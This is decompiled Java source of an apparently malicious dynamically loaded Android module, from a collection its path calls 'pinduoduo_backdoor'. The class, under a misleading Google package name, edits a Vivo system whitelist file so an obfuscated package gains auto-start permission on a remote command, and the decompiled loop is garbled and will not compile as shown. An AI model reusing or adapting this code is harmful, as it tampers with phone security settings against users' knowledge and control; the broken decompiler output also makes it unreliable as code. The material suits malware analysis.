package com.google.android.sd.biz_dynamic_dex.vivo_association_start;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.io.File;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import org.json.JSONObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class VivoAssociationStartExecutor extends DynamicCmdExecutor {
  private final int CMD = 38;
  
  private final String filePathPre = "/data/bbkcore/com.";
  
  private final String targetName = "vuuDWZ53x0/ViKDBztiHmSkH4HgjsI/PhI6v9rFk2U8=";
  
  private void addNode(String paramString1, String paramString2, Document paramDocument, Node paramNode) {
    Element element = paramDocument.createElement(paramString1);
    element.setAttribute("name", "vuuDWZ53x0/ViKDBztiHmSkH4HgjsI/PhI6v9rFk2U8=");
    element.setAttribute("whitelist", "");
    element.setAttribute("blacklist", "");
    element.setAttribute("kind", paramString2);
    NodeList nodeList = paramDocument.getElementsByTagName(paramString1);
    paramNode.insertBefore(element, nodeList.item(nodeList.getLength() - 1));
  }
  
  private void debugLog(String paramString, Object... paramVarArgs) {}
  
  private void doAssociationStart(Context paramContext, String paramString) {
    CmdData cmdData = new CmdData(38, paramString, "client");
    try {
      String str = contactXmlParse(paramContext);
      if (TextUtils.equals(str, "suc") || TextUtils.equals(str, "suc_already")) {
        CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, null, null));
        return;
      } 
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, str, null));
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception_");
      stringBuilder.append(exception.getMessage());
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } 
  }
  
  private boolean document2Xml(Context paramContext, Document paramDocument, File paramFile) throws Exception {
    paramDocument.getDocumentElement().normalize();
    Transformer transformer = TransformerFactory.newInstance().newTransformer();
    transformer.setOutputProperty("indent", "yes");
    transformer.setOutputProperty("doctype-public", "yes");
    DOMSource dOMSource = new DOMSource(paramDocument);
    File file = new File(paramContext.getFilesDir(), "temp_xml.xml");
    transformer.transform(dOMSource, new StreamResult(file));
    boolean bool = DynamicUtils.copyFile(file, paramFile);
    file.delete();
    return bool;
  }
  
  private String getFilePath(String paramString) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(paramString);
    stringBuilder.append("vivo.appfilter_bringupWhiteList.xml");
    return stringBuilder.toString();
  }
  
  public String contactXmlParse(Context paramContext) throws Exception {
    File file = new File(getFilePath("/data/bbkcore/com."));
    Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
    document.getDocumentElement().normalize();
    Element element = document.getDocumentElement();
    if (!TextUtils.equals(element.getNodeName(), "packagenames"))
      return "invalid_root_node"; 
    NodeList nodeList = element.getChildNodes();
    if (nodeList == null)
      return "node_list_null"; 
    int i = 0;
    boolean bool2 = false;
    boolean bool3 = false;
    boolean bool1 = false;
    while (i < nodeList.getLength()) {
      Node node = nodeList.item(i);
      if (node != null) {
        NamedNodeMap namedNodeMap = node.getAttributes();
        if (namedNodeMap != null) {
          String str1 = node.getNodeName();
          Node node1 = namedNodeMap.getNamedItem("name");
          Node node2 = namedNodeMap.getNamedItem("kind");
          String str3 = node2.getNodeValue();
          String str2 = node1.getNodeValue();
          boolean bool4 = bool1;
          if (TextUtils.equals(str2, "vuuDWZ53x0/ViKDBztiHmSkH4HgjsI/PhI6v9rFk2U8=")) {
            if (TextUtils.equals(str1, "package")) {
              if (!TextUtils.equals(str3, "1")) {
                node2.setNodeValue("1");
                bool4 = true;
              } 
              bool2 = true;
            } 
            boolean bool5 = bool2;
            bool1 = bool4;
            if (TextUtils.equals(str1, "package_v3")) {
              bool1 = bool4;
              if (!TextUtils.equals(str3, "6")) {
                node2.setNodeValue("6");
                bool1 = true;
              } 
              bool3 = true;
              bool5 = bool2;
            } 
            continue;
          } 
        } 
      } 
      boolean bool = bool2;
      continue;
      i++;
      object = SYNTHETIC_LOCAL_VARIABLE_7;
    } 
    if (!bool2) {
      addNode("package", "1", document, element);
      bool1 = true;
    } 
    if (!bool3) {
      addNode("package_v3", "6", document, element);
      bool1 = true;
    } 
    return !bool1 ? "suc_already" : (document2Xml(paramContext, document, file.getAbsoluteFile()) ? "suc" : "copy_fail");
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
      doAssociationStart(paramContext, (new JSONObject(paramString)).optString("uuid"));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8b56d820-cac2-4ca0-8a3a-1083c5cca7ae-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_association_start\VivoAssociationStartExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */